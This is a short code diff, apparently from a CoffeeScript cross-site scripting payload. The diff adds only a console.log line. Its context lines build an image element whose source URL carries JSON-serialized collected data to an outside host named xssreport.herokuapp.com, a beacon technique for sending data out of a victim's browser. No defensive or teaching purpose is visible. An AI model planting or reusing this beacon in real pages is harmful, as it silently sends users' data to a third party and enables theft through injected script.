@@ -13,5 +13,6 @@ catch error
 try
     img = document.createElement("img")
     img.src = "https://xssreport.herokuapp.com/img/?d=" + encodeURI(JSON.stringify(data))
+    console.log img.src
 catch e
     pass
